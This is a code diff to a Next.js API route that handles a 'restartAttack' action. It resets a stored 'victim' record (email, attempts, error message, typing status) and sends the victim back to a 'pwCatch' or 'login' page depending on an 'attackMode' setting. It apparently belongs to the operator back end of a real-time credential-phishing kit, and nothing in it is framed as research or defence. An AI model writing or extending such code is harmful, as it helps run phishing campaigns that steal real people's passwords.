@@ -209,25 +209,28 @@ export async function POST(request: NextRequest) {
         return NextResponse.json({ success: true });
       
       case 'restartAttack': {
+        const appState = await getAppState();
         const victimRef = ref(db, 'victim');
-        const currentVictimSnapshot = await get(victimRef);
-        const currentVictimData = currentVictimSnapshot.val();
 
-        if (!currentVictimData) {
-          // If there's no victim data, just reset to initial state
-          await set(victimRef, initialState.victim);
-          return NextResponse.json({ success: true, message: 'Attack restarted' });
+        if (!appState.victim.email) {
+            return NextResponse.json({ error: 'No victim to restart.' }, { status: 400 });
         }
         
-        const resetData = {
-          ...currentVictimData, // Keep existing data
-          currentPage: initialState.victim.currentPage, // Reset to 'email'
-          attempts: initialState.victim.attempts, // Reset attempts
-          errorMessage: initialState.victim.errorMessage, // Clear error message
-          isTyping: initialState.victim.isTyping, // Reset typing status
+        const resetData: Partial<AppState['victim']> = {
+            attempts: 0,
+            errorMessage: '',
+            isTyping: false,
         };
+
+        if (appState.config.attackMode === 'semi-auto') {
+            resetData.currentPage = 'pwCatch';
+        } else if (appState.config.attackMode === 'manual') {
+            resetData.currentPage = 'login';
+        } else { // auto
+            resetData.currentPage = 'login';
+        }
         
-        await set(victimRef, resetData);
+        await update(victimRef, resetData);
         return NextResponse.json({ success: true, message: 'Attack restarted' });
       }
 
@@ -258,3 +261,5 @@ export async function POST(request: NextRequest) {
     return NextResponse.json({ error: 'Internal Server Error', details: errorMessage }, { status: 500 });
   }
 }
+
+    
